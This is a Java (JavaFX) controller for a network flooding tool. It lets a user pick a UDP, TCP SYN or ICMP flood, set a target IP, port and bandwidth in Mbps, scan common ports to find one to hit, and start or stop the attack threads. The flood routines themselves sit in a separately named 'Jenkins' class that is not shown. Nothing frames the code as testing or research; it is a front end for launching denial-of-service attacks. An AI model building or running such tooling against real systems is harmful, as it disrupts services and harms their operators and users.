package com.yourpackage;

import javafx.fxml.FXML;
import javafx.scene.control.TextField;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.ComboBox;
import javafx.collections.FXCollections;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import javafx.scene.control.TextArea;
import javafx.application.Platform;
import java.net.InetSocketAddress;
import java.io.IOException;

public class MainController {
    private Jenkins jenkinsTool;

    @FXML private TextField ipAddressField;
    @FXML private TextField portField;
    @FXML private TextField mbpsField;
    @FXML private TextField macAddressField;
    @FXML private ComboBox<String> attackTypeComboBox;
    @FXML private Button startButton;
    @FXML private Button stopButton;
    @FXML private Button pingButton;
    @FXML private Button getMacButton;
    @FXML private Label statusLabel;
    @FXML private TextArea logArea;
    @FXML private Button findOpenPortButton;

    @FXML
    public void initialize() {
        jenkinsTool = new Jenkins();
        attackTypeComboBox.setItems(FXCollections.observableArrayList("UDP Flood", "TCP SYN Flood", "ICMP Flood"));
        attackTypeComboBox.setValue("UDP Flood");

        attackTypeComboBox.setOnAction(event -> {
            String selectedAttack = attackTypeComboBox.getValue();
            boolean isTcpAttack = "TCP SYN Flood".equals(selectedAttack);
            ipAddressField.setDisable(!isTcpAttack);
            portField.setDisable(!isTcpAttack);
            findOpenPortButton.setDisable(!isTcpAttack);
        });

        startButton.setOnAction(event -> startAttack());
        stopButton.setOnAction(event -> stopAttack());
    }

    @FXML
    public void pingTargetIP() {
        try {
            String ip = ipAddressField.getText();
            InetAddress address = InetAddress.getByName(ip);
            log("Pinging " + ip + "...");
            boolean reachable = address.isReachable(5000);
            String result = reachable ? "Ping successful" : "Ping failed";
            log(result);
            statusLabel.setText(result);
        } catch (Exception e) {
            log("Error: " + e.getMessage());
            statusLabel.setText("Error: " + e.getMessage());
        }
    }

    @FXML
    public void getMacAddress() {
        // Implementation
    }

    public void startAttack() {
        String attackType = attackTypeComboBox.getValue();
        String targetIp = ipAddressField.getText();
        int mbps = Integer.parseInt(mbpsField.getText());
        int bytesPerSecond = mbps * 125000; // Convert Mbps to bytes per second

        statusLabel.setText("Status: Attack in Progress");
        statusLabel.setStyle("-fx-text-fill: #ff0000; -fx-effect: dropshadow(gaussian, #ff0000, 5, 0, 0, 0);");

        if ("UDP Flood".equals(attackType)) {
            log("Starting UDP flood attack...");
            new Thread(() -> jenkinsTool.udpFlood(targetIp, 0, bytesPerSecond)).start();
        } else if ("TCP SYN Flood".equals(attackType)) {
            int targetPort = Integer.parseInt(portField.getText());
            log("Starting TCP SYN flood attack...");
            new Thread(() -> jenkinsTool.tcpSynFlood(targetIp, targetPort, bytesPerSecond)).start();
        } else if ("ICMP Flood".equals(attackType)) {
            log("Starting ICMP flood attack...");
            new Thread(() -> jenkinsTool.icmpFlood(targetIp, bytesPerSecond)).start();
        }
    }

    public void stopAttack() {
        jenkinsTool.stopAttack();
        log("Attack stopped");
        statusLabel.setText("Status: Idle");
        statusLabel.setStyle("-fx-text-fill: #00ff00; -fx-effect: dropshadow(gaussian, #00ff00, 5, 0, 0, 0);");
    }

    @FXML
    public void findOpenPort() {
        String ip = ipAddressField.getText();
        log("Searching for open ports on " + ip);
        int[] commonPorts = {80, 443, 22, 21, 25, 3306, 8080, 1433, 3389, 5432};
        for (int port : commonPorts) {
            try (Socket socket = new Socket()) {
                socket.connect(new InetSocketAddress(ip, port), 100);
                portField.setText(String.valueOf(port));
                String message = "Open port found: " + port;
                log(message);
                statusLabel.setText(message);
                return;
            } catch (IOException e) {
                // Port is not open, continue to next
            }
        }
        String message = "No open ports found";
        log(message);
        statusLabel.setText(message);
    }

    private void log(String message) {
        String timestamp = java.time.LocalDateTime.now().format(java.time.format.DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
        Platform.runLater(() -> {
            logArea.appendText(timestamp + " - " + message + "\n");
            logArea.setScrollTop(Double.MAX_VALUE);
        });
    }
}